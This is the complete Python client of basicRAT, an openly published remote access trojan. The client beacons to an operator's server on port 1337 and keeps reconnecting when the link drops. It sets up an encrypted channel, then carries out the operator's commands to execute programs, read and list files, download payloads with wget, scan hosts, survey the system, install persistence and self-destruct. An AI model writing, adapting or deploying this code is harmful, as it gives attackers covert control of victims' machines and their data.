#!/usr/bin/env python

#
# basicRAT client
# https://github.com/vesche/basicRAT
#

import socket
import sys
import time

from core import *


# change these to suit your needs
HOST = 'localhost'
PORT = 1337

# seconds to wait before client will attempt to reconnect
CONN_TIMEOUT = 30

# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else:
    print 'This platform is not supported.'
    sys.exit(1)


def client_loop(conn, dhkey):
    while True:
        results = ''

        # wait to receive data from server
        data = crypto.decrypt(conn.recv(4096), dhkey)

        # seperate data into command and action
        cmd, _, action = data.partition(' ')

        if cmd == 'kill':
            conn.close()
            return 1

        elif cmd == 'selfdestruct':
            conn.close()
            toolkit.selfdestruct(PLAT)

        elif cmd == 'quit':
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break

        elif cmd == 'persistence':
            results = persistence.run(PLAT)

        elif cmd == 'scan':
            results = scan.single_host(action)

        elif cmd == 'survey':
            results = survey.run(PLAT)

        elif cmd == 'cat':
            results = toolkit.cat(action)

        elif cmd == 'execute':
            results = toolkit.execute(action)

        elif cmd == 'ls':
            results = toolkit.ls(action)

        elif cmd == 'pwd':
            results = toolkit.pwd()

        elif cmd == 'unzip':
            results = toolkit.unzip(action)

        elif cmd == 'wget':
            results = toolkit.wget(action)

        results = results.rstrip() + '\n{} completed.'.format(cmd)

        conn.send(crypto.encrypt(results, dhkey))


def main():
    exit_status = 0

    while True:
        conn = socket.socket()

        try:
            # attempt to connect to basicRAT server
            conn.connect((HOST, PORT))
        except socket.error:
            time.sleep(CONN_TIMEOUT)
            continue

        dhkey = crypto.diffiehellman(conn)

        # This try/except statement makes the client very resilient, but it's
        # horrible for debugging. It will keep the client alive if the server
        # is torn down unexpectedly, or if the client freaks out.
        try:
            exit_status = client_loop(conn, dhkey)
        except: pass

        if exit_status:
            sys.exit(0)


if __name__ == '__main__':
    main()
